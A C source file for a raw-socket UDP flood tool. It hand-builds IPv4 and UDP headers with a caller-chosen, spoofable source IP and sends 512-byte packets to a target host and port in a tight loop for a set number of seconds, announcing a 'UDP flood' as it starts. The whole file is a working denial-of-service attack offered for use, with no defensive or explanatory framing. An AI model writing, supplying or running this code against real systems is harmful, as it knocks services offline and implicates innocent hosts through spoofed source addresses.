#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <time.h>

#define PACKET_SIZE 4096
#define PAYLOAD_SIZE 512

/* Generic Internet Checksum Function (RFC 1071) */
unsigned short compute_checksum(unsigned short *ptr, int nbytes) {
    long sum = 0;
    unsigned short oddbyte;
    short answer;

    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((unsigned char *)&oddbyte) = *(unsigned char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (short)~sum;
    return answer;
}

int main(int argc, char *argv[]) {
    if (argc < 4) {
        printf("Usage: %s <Source IP> <Target IP> <Target Port> [Duration in Sec]\n", argv[0]);
        printf("Example: %s 10.1.0.2 10.2.0.2 80 10\n", argv[0]);
        return 1;
    }

    char *src_ip = argv[1];
    char *dst_ip = argv[2];
    int dst_port = atoi(argv[3]);
    int duration = (argc >= 5) ? atoi(argv[4]) : 10;

    // 1. Create Raw Socket bypassing kernel transport layer
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("Failed to create raw socket (Must run with root/sudo privileges)");
        exit(EXIT_FAILURE);
    }

    // 2. Enable IP_HDRINCL to supply custom IP headers
    int optval = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(optval)) < 0) {
        perror("Error setting IP_HDRINCL");
        close(sock);
        exit(EXIT_FAILURE);
    }

    char packet[PACKET_SIZE];
    memset(packet, 0, PACKET_SIZE);

    struct iphdr *ip = (struct iphdr *)packet;
    struct udphdr *udp = (struct udphdr *)(packet + sizeof(struct iphdr));
    char *payload = packet + sizeof(struct iphdr) + sizeof(struct udphdr);

    memset(payload, 'A', PAYLOAD_SIZE);

    // 3. Populate IP Header
    ip->ihl = 5;
    ip->version = 4;
    ip->tos = 0;
    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + PAYLOAD_SIZE);
    ip->id = htons(54321);
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_UDP;
    ip->check = 0;
    ip->saddr = inet_addr(src_ip);
    ip->daddr = inet_addr(dst_ip);
    ip->check = compute_checksum((unsigned short *)packet, ip->ihl * 4);

    // 4. Populate UDP Header
    udp->source = htons(4321);
    udp->dest = htons(dst_port);
    udp->len = htons(sizeof(struct udphdr) + PAYLOAD_SIZE);
    udp->check = 0;

    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(dst_port);
    dest_addr.sin_addr.s_addr = inet_addr(dst_ip);

    printf("[+] Initiating raw socket UDP flood...\n");
    printf("    Target: %s:%d | Source: %s | Duration: %d seconds\n", dst_ip, dst_port, src_ip, duration);

    time_t start_time = time(NULL);
    unsigned long packet_count = 0;

    while (time(NULL) - start_time < duration) {
        if (sendto(sock, packet, ntohs(ip->tot_len), 0,
                   (struct sockaddr *)&dest_addr, sizeof(dest_addr)) < 0) {
            perror("sendto() failed");
            break;
        }
        packet_count++;
    }

    printf("[+] Flood run complete.\n");
    printf("[+] Transmitted: %lu packets\n", packet_count);

    close(sock);
    return 0;
}
